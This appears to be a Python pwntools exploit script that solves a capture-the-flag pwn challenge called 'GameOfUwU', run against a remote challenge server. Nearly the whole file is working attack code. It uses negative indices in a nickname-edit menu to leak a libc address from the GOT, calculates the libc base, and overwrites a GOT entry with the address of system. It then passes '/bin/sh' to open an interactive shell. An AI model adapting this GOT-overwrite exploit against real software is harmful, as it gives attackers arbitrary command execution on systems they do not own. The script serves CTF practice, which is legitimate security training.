from pwn import * 
import time 
binary = ("./GameOfUwU_patched")

p = process(binary)
p = remote("chal.firebird.sh", 35029)
libc = ELF('./libc.so.6')

elf = ELF(binary)
s = 'b*edit_nickname+127'
#gdb.attach(p, s)
p.sendline(b'1') # press any key to continue

#context.log_level = 'debug'
# overwriting FireUwU

p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')

p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
p.sendline(b'1')
p.sendlineafter(b"What is its new nickname?", b'/bin/sh')


p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')
p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")

p.sendline(b'-2')
p.recvuntil(b"  Please get a new name to ")

# parse the leaked address to int, hex and potentially further conver to other formats 
GOT_leak = int.from_bytes(p.recvuntil(b"!", drop = True), 'little')
libc.address = GOT_leak - libc.sym['rand'] # calculate the libc base
print(hex(GOT_leak)) # debugging 
print(hex(libc.address)) # debugging 
#print(hex(libc.sym['rand']))


# preserving the leaked address, for a second entry to overwrite fgets (success)
preserved = GOT_leak.to_bytes(6, 'little')
p.sendlineafter(b"What is its new nickname?", preserved)


system_addr = libc.sym['system'] # calculate the offset of system 
print(hex(system_addr)) # debugging 


# Going to overwrite fgets, overwrite is possible know by manual test 
p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')
p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")

p.sendline(b'-7')
p.recvuntil(b"  Please get a new name to ")
payload = b'A' * 8 + system_addr.to_bytes(6, 'little') # index 6 to access srand and write downwards (up acutally)
p.sendlineafter(b"What is its new nickname?", payload)




# pass /bin/sh into fgets!!, commented to pass in manually kk4
time.sleep(0.5)
p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')
time.sleep(0.5)
p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")

p.sendline(b'1')
time.sleep(0.5)
p.sendlineafter(b"What is its new nickname?", b'/bin/sh')


p.interactive()



#print(hex(libc.address))
#print(hex(libc.sym['rand']))


